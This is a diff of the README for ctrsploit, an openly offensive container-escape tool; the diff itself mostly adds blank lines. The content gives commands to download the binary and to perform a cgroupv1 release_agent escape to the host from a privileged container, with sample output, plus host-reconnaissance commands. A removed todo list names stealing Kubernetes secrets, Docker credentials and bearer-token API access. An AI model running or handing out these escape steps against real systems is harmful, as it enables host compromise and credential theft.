@@ -3,7 +3,9 @@
 [中文文档](./README-ZH.md)
 
 ## usage
+
 ### help
+
 ```
 wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.1/ctrsploit_linux_amd64 && chmod +x ctrsploit
 ./ctrsploit --help
@@ -28,6 +30,7 @@ GLOBAL OPTIONS:
 ```
 
 ### run a exploit
+
 ```
 root@2aa13a052102:/# ./ctrsploit e
 NAME:
@@ -47,6 +50,7 @@ OPTIONS:
 ```
 
 eg. : escape by 'cgroupv1-release_agent' tech.
+
 ```
 root@host # docker run -ti --rm --security-opt="seccomp=unconfined" --cap-add="sys_admin" busybox
 root@ctr # wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.1/ctrsploit_linux_amd64 && chmod +x ctrsploit
@@ -54,6 +58,7 @@ root@ctr # ./ctrsploit e ra -c "cat /etc/hostname"
 ```
 
 if we do not know the rootfs of container, ctrsploit can still escape by release agent tech
+
 ```
 [root@container /]# ./ctrsploit e ra3 -c "cat /etc/hostname"
 INFO[0000] trying 100                                   
@@ -71,7 +76,9 @@ cce-arm-euler28-30231
 ```
 
 ### gather information
+
 usage
+
 ```
 root@ctr:/# ./ctrsploit env
 NAME:
@@ -91,6 +98,7 @@ OPTIONS:
 ```
 
 where
+
 ```
 root@ctr:/# ./ctrsploit  env  w
 INFO[0000] ===========Docker=========
@@ -109,6 +117,7 @@ cgroup contains 'kubepods': ✘
 ```
 
 cgroup version
+
 ```
 root@ctr:/# ./ctrsploit env c
 INFO[0000] ===========Cgroups=========
@@ -117,6 +126,7 @@ is cgroupv2: ✔
 ```
 
 graph driver
+
 ```
 root@ctr:/# ./ctrsploit env g
 INFO[0000] ===========Overlay=========
@@ -129,6 +139,7 @@ The host path of container's rootfs: /var/lib/docker/devicemapper/mnt/1659264e84
 ```
 
 capability
+
 ```
 root@ctr:/# ./ctrsploit env cap
 INFO[0000] ===========Capability=========
@@ -154,59 +165,9 @@ current process
 ```
 
 ## pre-built release
+
 https://github.com/ssst0n3/ctrsploit/releases
 
 ## Todo List
-- [ ] information gather
-    - [ ] whether in container
-      - [ ] current container env
-        - [ ] swarm
-        - [x] k8s
-          - [x] `ls -lah /var/run/secrets/kubernetes.io`
-          - [x] `cat /proc/self/mountinfo | grep hosts |grep pods`
-          - [x] `cat /proc/self/cgroup |grep kubepods`
-          - [x] `cat /etc/hostname`
-      - [ ] current cri
-        - [x] docker
-          - [x] `ls -lah /.dockerenv`
-          - [x] `head -n 1 /proc/self/mountinfo | grep docker`
-          - [x] `cat /proc/self/cgroup |grep docker`
-          - [x] `cat /proc/self/mountinfo | grep "hosts|hostname" |grep docker`
-          - [x] `cat /etc/hostname` // not convinced
-        - [ ] containerd
-        - [ ] ...
-    - [ ] current container software version
-      - [ ] cluster api: curl -k https://10.0.0.233:5443/apis/version.cce.io/v1beta1 --header "Authorization: Bearer $token"
-    - [ ] current container ID
-    - [ ] the security protection
-        - [ ] capability
-        - [ ] seccomp
-        - [ ] LSM
-        - [ ] cgroup
-            - [ ] cgroup version
-                - [x] v1
-                - [x] v2
-    - [ ] block dev name
-        - [ ] /sys/block/nvme0n1
-    - [ ] the absolute path under host of container's rootfs
-        - [ ] docker
-        - [ ] k8s variant 1
-        - [ ] k8s variant 2
-    - [ ] openstack api accessibility
-    - [ ] graphdriver
-        - [x] overlay
-        - [x] devicemapper
-        - [ ] aufs
-- [ ] execute
-    - [ ] outside of container
-        - [ ] get docker credentials
-            - [ ] $HOME/.docker/config.json
-- [ ] exploit
-    - [ ] CVE-2019-16884
-    - [ ] CVE-2019-14271
-    - [ ] CVE-2021-21285  
-    - [ ] mount dir->symlink->mount again escape
-    - [x] cgroupv1 notify_on_release escape
-        - [x] unknown rootfs support 
-    - [x] cgroupv1 notify_on_release escape with unknown rootfs
-- [ ] auto exploit
+
+see [FEATURES.md](./FEATURES.md)
